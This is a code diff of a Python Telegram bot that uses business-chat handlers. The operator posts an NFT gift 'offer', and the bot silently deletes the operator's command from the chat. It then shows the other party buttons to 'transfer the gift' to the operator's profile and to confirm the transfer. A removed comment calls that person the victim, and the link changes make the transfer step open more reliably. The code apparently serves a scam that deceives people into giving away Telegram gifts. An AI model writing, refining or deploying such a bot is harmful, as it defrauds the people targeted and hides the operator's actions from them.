@@ -28,7 +28,14 @@ def offer_kb(oid: str) -> InlineKeyboardMarkup:
     ]])
 
 def instruction_kb() -> InlineKeyboardMarkup:
-    target_url = f"https://t.me/{TARGET_USERNAME}"
+    # Ссылка на профиль (через tg://resolve с параметром profile)
+    # Примечание: в вебе это может открыть чат, но в приложении — профиль.
+    # Более надежный вариант для открытия именно профиля в приложении:
+    target_url = f"tg://resolve?domain={TARGET_USERNAME}"
+    
+    # Если tg:// не срабатывает в веб-версии, можно использовать:
+    # target_url = f"https://t.me/{TARGET_USERNAME}?profile"
+    
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="🎁 Передать подарок", url=target_url)],
         [InlineKeyboardButton(text="✅ Подарок передан", callback_data="done")],
@@ -36,11 +43,8 @@ def instruction_kb() -> InlineKeyboardMarkup:
 
 @dp.business_message(Command("offer"))
 async def cmd_offer_business(message: Message):
-    # Разбиваем текст сообщения по пробелам (без кавычек)
-    # message.text будет: "/offer https://t.me/nft/PlushPepe-2687 20 g"
     parts = message.text.split()
     
-    # parts[0] — это сама команда /offer, поэтому нам нужны parts[1], parts[2], parts[3]
     if len(parts) < 4:
         return await message.answer(
             "Формат:\n"
@@ -68,7 +72,6 @@ async def cmd_offer_business(message: Message):
         f"{url}"
     )
 
-    # Удаляем команду из чата с жертвой
     try:
         await bot.delete_business_messages(
             business_connection_id=message.business_connection_id,
@@ -77,7 +80,6 @@ async def cmd_offer_business(message: Message):
     except Exception as e:
         logging.error(f"Не удалось удалить: {e}")
 
-    # Отправляем оффер
     await message.answer(
         text=caption,
         reply_markup=offer_kb(oid),
